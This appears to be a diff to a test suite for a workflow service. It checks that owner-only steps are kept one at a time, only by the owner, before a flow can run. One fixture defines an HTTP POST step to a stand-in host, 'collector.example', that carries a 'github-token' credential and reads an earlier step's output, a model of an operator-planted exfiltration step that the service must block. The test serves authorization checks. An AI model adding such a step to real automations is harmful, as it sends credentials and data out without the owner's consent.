@@ -916,13 +916,44 @@ describe("a step only the owner may run", () => {
     await expect(service.launch(flow.id, "owner-1", { role: "owner" })).rejects.toThrow(/^This flow is no longer valid: step 2 \(Stop publishing an app to the internet\) is one only the owner may run, .*"Keep this step"/);
     await expect(service.run(flow.id, "owner-1", { role: "owner" })).rejects.toThrow(/only the owner may run/);
     expect(jobs.calls).toEqual([]);
-    expect((await service.list()).find((entry) => entry.id === flow.id).ownerToKeep).toEqual({ step: 2, title: "Stop publishing an app to the internet" });
-    // Keep this step: the owner saves the steps as they are, and the step is now one the owner put there.
-    await service.update(flow.id, { steps: (await service.list()).find((entry) => entry.id === flow.id).steps }, "owner-1", { role: "owner" });
+    expect((await service.list()).find((entry) => entry.id === flow.id).ownerToKeep).toEqual([{ step: 2, title: "Stop publishing an app to the internet", reads: [] }]);
+    // Keep this step: the owner keeps step 2, which is now one the owner put there.
+    await service.update(flow.id, { keepStep: 2 }, "owner-1", { role: "owner" });
     expect(store.getFlow(flow.id).steps[1]).toMatchObject({ ...unpublish, ownerAdded: true });
-    expect((await service.list()).find((entry) => entry.id === flow.id).ownerToKeep).toBeNull();
+    expect((await service.list()).find((entry) => entry.id === flow.id).ownerToKeep).toEqual([]);
     await service.run(flow.id, "owner-1", { role: "owner" });
     expect(jobs.calls.map((call) => call.operationId)).toEqual(["controller.backup.create", "cloudflare.unpublish"]);
+  });
+
+  it("is kept one at a time: keeping step 2 does not keep step 4 (sweep 4)", async () => {
+    // "Keep this step" sent every step back, and the owner's save marked every owner-only step kept:
+    // keeping the one the notice named kept another the owner had never been shown.
+    const store = withOperators(fakeStore());
+    const jobs = fakeJobs(store);
+    const service = createFlowService({ store, jobs, pollMs: 2 });
+    const send = { operationId: "http.request", parameters: { url: "https://collector.example/{{ steps.first.status }}", method: "POST", credentialName: "github-token" } };
+    const flow = store.createFlow({ name: "Tidy", steps: [{ ...goodSteps[0], name: "first" }, unpublish, goodSteps[0], send], createdBy: "operator-1" });
+    const listed = async () => (await service.list()).find((entry) => entry.id === flow.id);
+    expect((await listed()).ownerToKeep).toEqual([
+      { step: 2, title: "Stop publishing an app to the internet", reads: [] },
+      { step: 4, title: "Send an HTTP request", reads: ["first"] },
+    ]);
+    await service.update(flow.id, { keepStep: 2 }, "owner-1", { role: "owner" });
+    expect(store.getFlow(flow.id).steps[1].ownerAdded).toBe(true);
+    expect(store.getFlow(flow.id).steps[3].ownerAdded).toBeUndefined();
+    expect((await listed()).ownerToKeep).toEqual([{ step: 4, title: "Send an HTTP request", reads: ["first"] }]);
+    await expect(service.run(flow.id, "owner-1", { role: "owner" })).rejects.toThrow(/step 4 \(Send an HTTP request\) is one only the owner may run/);
+    // Saving the steps back as they are keeps nothing that was not kept; changing one makes it the owner's.
+    await service.update(flow.id, { steps: store.getFlow(flow.id).steps }, "owner-1", { role: "owner" });
+    expect(store.getFlow(flow.id).steps[3].ownerAdded).toBeUndefined();
+    // Only an unkept owner-only step can be kept, only by the owner, and with nothing else changed.
+    await expect(service.update(flow.id, { keepStep: 1 }, "owner-1", { role: "owner" })).rejects.toThrow(/Step 1 has nothing to keep/);
+    await expect(service.update(flow.id, { keepStep: 9 }, "owner-1", { role: "owner" })).rejects.toThrow(/Step 9 has nothing to keep/);
+    await expect(service.update(flow.id, { keepStep: 4 }, "operator-1", { role: "operator" })).rejects.toThrow(/Only the owner can keep/);
+    await expect(service.update(flow.id, { keepStep: 4, name: "Renamed" }, "owner-1", { role: "owner" })).rejects.toThrow(/on its own/);
+    await service.update(flow.id, { keepStep: 4 }, "owner-1", { role: "owner" });
+    expect((await listed()).ownerToKeep).toEqual([]);
+    expect(store.getFlow(flow.id).name).toBe("Tidy");
   });
 
   it("in the owner's own flow runs as it always did", async () => {
